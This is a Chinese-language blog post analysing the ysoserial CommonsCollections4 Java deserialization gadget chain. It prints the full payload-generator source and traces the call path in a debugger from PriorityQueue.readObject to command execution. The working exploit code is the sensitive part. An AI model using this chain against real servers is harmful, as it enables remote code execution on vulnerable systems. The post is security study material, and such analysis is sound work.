ysoserial代码分析-CommonsCollections4
2022-03-01 16:57:30

1.前言

本篇文章为学习ysoserial代码系列的第四篇，分析的攻击链为CommonsCollections4，源码是以github上最新版ysoserial代码为例下载地址，具体运行环境为jdk 1.8+ 和 maven 3.x.+为主。

以下是CommonsCollections4的源码，依赖的库为org.apache.commons:commons-collections4:4.0：

public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {

	public Queue<Object> getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		ConstantTransformer constant = new ConstantTransformer(String.class);

		// mock method name until armed
		Class[] paramTypes = new Class[] { String.class };
		Object[] args = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(
				paramTypes, args);

		// grab defensively copied arrays
		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
		args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

		// create queue with numbers
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// swap in values to arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		args[0] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections4.class, args);
	}
}


2.代码分析

和CommonsCollections2攻击链一样，首先生成带有恶意代码的TemplatesImpl类对象。

依次生成ConstantTransformer对象和InstantiateTransformer对象。

使用反射的方式将InstantiateTransformer对象内的两个参数的引用取出。

用ConstantTransformer对象和InstantiateTransformer对象生成ChainedTransformer数组。

生成PriorityQueue队列，使用ChainedTransformer数组生成TransformingComparator对象，传入PriorityQueue的构造方法中。

使用反射的方式将ConstantTransformer对象对象内的iConstant变量赋值为TrAXFilter.class，将InstantiateTransformer对象的内部参数赋值为Templates.class和含有恶意代码的TemplatesImpl对象，并返回。

3.调试运行

使用CommonsCollections4提供的测试代码，在Runtime的exec方法处下断点。

在PriorityQueue类的readObject方法中进入heapify方法。

在heapify方法中进入siftDown方法。

在siftDown方法中进入siftDownUsingComparator方法。

在siftDownUsingComparator方法中进入comparator变量的compare方法。

在compare方法中调用了transform方法。

在InstantiateTransformer对象的transform方法中，反射调用了TrAXFilter类的构造方法。

后续的执行调用和CommonsCollections3一致，命令执行成功。
